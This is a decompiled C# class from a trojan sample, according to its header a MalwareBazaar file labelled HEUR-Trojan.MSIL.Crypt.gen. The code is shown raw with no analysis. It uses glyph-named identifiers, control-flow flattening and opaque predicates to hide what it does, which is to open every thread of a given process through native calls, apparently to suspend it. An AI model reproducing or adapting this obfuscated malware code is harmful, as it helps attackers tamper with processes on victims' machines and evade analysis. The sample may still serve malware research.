// Decompiled with JetBrains decompiler
// Type: @ӥ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;

internal sealed class \u0040ӥ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string XhX() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u003249() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӥ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040ӥ.\u0040ӣ();
    int num1;
    if (!\u0040ӥ.\u0040Ӥ())
    {
      num1 = 3;
    }
    else
    {
      num1 = 2;
      if (\u0040ӥ.\u0040Ӥ())
        ;
    }
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_3;
        case 1:
        case 2:
          goto label_5;
        case 4:
          goto label_8;
        default:
          num1 = 4;
          continue;
      }
    }
label_3:
    \u0040ӥ.\u0040ӕ();
label_5:
    \u0040ӥ.\u0040Ӗ((object) this);
label_8:
    try
    {
      Process process = (Process) \u0040ӥ.\u0040Ә(\u0040ӥ.\u0040ӗ((object) _param2));
      if (\u0040ӥ.\u0040Ӛ(\u0040ӥ.\u0040ә((object) process), (object) string.Empty))
      {
        IEnumerator enumerator = (IEnumerator) \u0040ӥ.\u0040Ӝ(\u0040ӥ.\u0040ӛ((object) process));
        try
        {
          while (\u0040ӥ.\u0040Ӡ((object) enumerator))
          {
            object obj = \u0040ӥ.\u0040ӝ((object) enumerator);
            int num2;
            if (!\u0040ӥ.\u0040Ӥ())
            {
              int num3 = 2;
              num2 = \u0040ӥ.\u0040Ӥ() ? num3 : num3;
            }
            else
              goto label_23;
label_15:
            IntPtr num4;
            bool flag;
            ProcessThread processThread;
            while (true)
            {
              switch (num2)
              {
                case 0:
                case 2:
                  processThread = (ProcessThread) obj;
                  goto case 1;
                case 1:
                case 4:
                  num4 = \u0040ԝ.\u0040ܗ((\u0040ԛ.\u0040Ӗ.\u0040ӓ) 2, false, (uint) \u0040ӥ.\u0040Ӟ((object) processThread));
                  num2 = 6;
                  continue;
                case 3:
                  \u0040ԛ.\u0040ӓ(num4);
                  if (true)
                  {
                    num2 = 8;
                    continue;
                  }
                  goto case 1;
                case 5:
                  int num5 = (int) \u0040ԝ.\u0040ն(num4);
                  num2 = 3;
                  continue;
                case 6:
                  flag = !\u0040ӥ.\u0040ӟ(num4, IntPtr.Zero);
                  goto case 7;
                case 7:
                  if (flag)
                  {
                    num2 = 5;
                    continue;
                  }
                  goto label_24;
                case 8:
                  goto label_24;
                default:
                  num2 = 7;
                  continue;
              }
            }
label_24:
            continue;
label_23:
            num2 = 4;
            goto label_15;
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0040ӥ.\u0040ӡ((object) disposable);
        }
      }
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӥ.\u0040Ӣ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӗ(object _param0) => Convert.ToInt32((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) Process.GetProcessById(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) ((Process) _param0).ProcessName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӛ(object _param0, object _param1) => (string) _param0 != (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((Process) _param0).Threads;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0) => (object) ((ReadOnlyCollectionBase) _param0).GetEnumerator();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ(object _param0) => ((IEnumerator) _param0).Current;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӟ(object _param0) => ((ProcessThread) _param0).Id;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӟ(IntPtr _param0, IntPtr _param1) => _param0 == _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӡ(object _param0) => ((IEnumerator) _param0).MoveNext();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӡ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӣ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӥ() => false;
}
